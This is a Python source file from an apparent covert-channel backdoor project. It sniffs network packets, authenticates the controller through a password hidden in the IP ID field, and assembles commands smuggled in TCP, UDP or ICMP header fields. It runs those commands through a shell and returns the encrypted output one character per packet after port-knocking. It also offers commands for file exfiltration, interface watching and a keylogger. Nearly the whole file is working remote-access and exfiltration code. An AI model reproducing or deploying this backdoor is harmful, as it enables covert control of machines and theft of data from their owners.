"""
/*---------------------------------------------------------------------------------------
--  SOURCE FILE:    recvFunctions.py
--
--  PROGRAM:        recvFunctions
--
--  FUNCTIONS:      recieveDatagram()
--					startServer()
--					packetHandler(packet)
--					authenticated(packet):
--					checkCommand(ip, proto, data, pacType)
--					executeCommand(srcAddress, pacType, command)
--					sendResults(address, protocol, comm)
--					sendMessage(address, protocol, message)
--					knockCode(address, protocol, openS)
--
--  DATE:           December 7th, 2014
--
--  DESIGNERS:      Jacob Miner
--
--  PROGRAMMERS:    Jacob Miner
--
--  NOTES:			A module containing functions used by the server, for recieving and 
--  				processing commands
---------------------------------------------------------------------------------------*/
"""

import socket
from subprocess import Popen, PIPE
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from struct import *
import sys
import os
import threading
import pcapy
import config
import backjake
import utils
import exfil
import spyFunctions

command = ""
pswd = utils.encrypt(config.password)

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   recieveDatagram()
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	recieveDatagram()
--
--  RETURNS:  	void	
--
--  NOTES:  	reads packets using pcap, then passes them to packetHandler to be
--  			parsed.
------------------------------------------------------------------------------*/
"""
def recieveDatagram():
	cap = pcapy.open_live(config.dev, 65536, 1, 0)
	fltr = "(tcp or udp or icmp) and not (ip src " + str(socket.gethostbyname(socket.gethostname()) + ")")
	cap.setfilter(fltr)

	while(backjake.running):
		(header, packet) = cap.next()
		packetHandler(packet)

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   startServer()
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	startServer()
--
--  RETURNS:   	void
--
--  NOTES:  	starts the listening thread to obtain packets.
--  
------------------------------------------------------------------------------*/
"""
def startServer():
	listenThread = threading.Thread(target=recieveDatagram)
	listenThread.daemon = True
	listenThread.start()

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   packetHandler(packet)
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	packetHandler(packet)
--					packet - the packet to handle
--
--  RETURNS:  	void
--
--  NOTES:  	checks if packet is authenticated, then checks the command
--  			and executes it
------------------------------------------------------------------------------*/
"""
def packetHandler(packet):
	if (authenticated(packet)):
		pacType = utils.checkType(packet)
		ip, protoH, data = utils.stripPacket(packet, pacType)
		checkCommand(ip, protoH, data, pacType)

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   authenticated(packet):
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	authenticated(packet):
--					packet - the packet to check for authentication
--
--  RETURNS:  	true if packet is authenticated, false otherwise
--
--  NOTES:  	checks if packet is from an authenticated user (encrypted password)
--  			matches ipID field.
------------------------------------------------------------------------------*/
"""
def authenticated(packet):	
	ethLength = 14
	ipLength = 20
	ip = packet[ethLength:ipLength+ethLength]
	ipHeader = unpack('!BBHHHBBH4s4s' , ip)
	ipIdent = ipHeader[3]

 	if ipIdent == pswd:
 		return True

 	return False

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   checkCommand(ip, proto, data, pacType)
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	checkCommand(ip, proto, data, pacType)
--					ip - the ip packet header
--					proto - the protocol specific header (tcp, udp, icmp)
--					data -	the payload of the packet
--					pacType - the protocol (tcp, udp, icmp)
--
--  RETURNS:  	void
--
--  NOTES:  	Parses the command from the packet, then executes it.
--  
------------------------------------------------------------------------------*/
"""
def checkCommand(ip, proto, data, pacType):
	global command
	character = ''

	if pacType == 'tcp':
		character = proto[2]
	elif pacType == 'udp':
		character = proto[3]
	elif pacType == 'icmp':
		character = proto[2]

	if character < 256:
		if character != 15:
			command += chr(character)
		else:
			command = utils.decryptData(command)
			executeCommand(socket.inet_ntoa(ip[8]), pacType, command)
			command = ""

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   executeCommand(srcAddress, pacType, command)
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	executeCommand(srcAddress, pacType, command)
--						srcAddress - the address the command came from
--						pacType - the protocol used (tcp, udp, icmp)
--						command - the command to executes
--
--  RETURNS:  	void
--
--  NOTES:  	executes the command. If it is not a bash command, it's one of the 
--  			server commands. Return results to client
------------------------------------------------------------------------------*/
"""
def executeCommand(srcAddress, pacType, command):
	if command == "?exit" or command == "?quit":
		thread.interrupt_main()
	elif "?intfA " in command:
		exfil.addWatch(command[7:], srcAddress, pacType)
	elif "?intfD " in command:
		exfil.removeWatch(command[7:])
	elif "?file " in command:
		exfil.sendFile(command[6:])
	elif "?connect" in command:
		knockCode(srcAddress, pacType, True)
		for c in utils.encryptData("Connected: "):
			send(utils.covertPacket(srcAddress, pacType, c, pswd), verbose=0)
		knockCode(srcAddress, pacType, False)
	elif "?keylogger" in command:
		exfil.startKeylogger(srcAddress, pacType)
	else:
		sendThread = threading.Thread(target=sendResults, args=(srcAddress,pacType,command))
		sendThread.start()

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   sendResults(address, protocol, comm)
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	sendResults(address, protocol, comm)
--						address - the address to send the results to 
--						protocol - the protocol to send the results through
--						comm - the command to execute
--
--  RETURNS:  	void
--
--  NOTES:  	runs the command using popen, then sends the results to the client
--  
------------------------------------------------------------------------------*/
"""
def sendResults(address, protocol, comm):
	knockCode(address, protocol, True)
	results = subprocess.Popen(comm, shell=True, stdout=PIPE).stdout.read()

	results = utils.encryptData(results)
	for c in results:
		send(utils.covertPacket(address, protocol, c, pswd), verbose=0)

	knockCode(address, protocol, False)

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   sendMessage(address, protocol, comm, message)
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	sendMessage(address, protocol, message)
--						address - the address to send the results to 
--						protocol - the protocol to send the results through
--						message - the message to send the client
--
--  RETURNS:  	void
--
--  NOTES:  	a wrapper for sending a message to the client. knocks, encrypts,
--  			then sends
------------------------------------------------------------------------------*/
"""
def sendMessage(address, protocol, message):
	knockCode(address, protocol, True)

	results = utils.encryptData(message)
	for c in results:
		send(utils.covertPacket(address, protocol, c, pswd), verbose=0)

	knockCode(address, protocol, False)

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   knockCode(address, protocol, openS)
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	knockCode(address, protocol, openS)
--						address - the address to send the knock code to
--						protocol - the protocol to send it with
--						openS - if true, send code to open. Otherwise, send code to close
--
--  RETURNS:  	void
--
--  NOTES:  	sends a knock code to the client, either open or close, to make the client
--  			listen for results
------------------------------------------------------------------------------*/
"""
def knockCode(address, protocol, openS):
	if openS:
		for k in config.knock:
			packet = IP(dst=address, id=k)
			if protocol == 'tcp':
				proto = TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535))
			elif protocol == 'udp':
				proto = UDP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535))
			elif protocol == 'icmp':
				proto = ICMP()
			send(packet/proto, verbose=0)
	# still gotta close
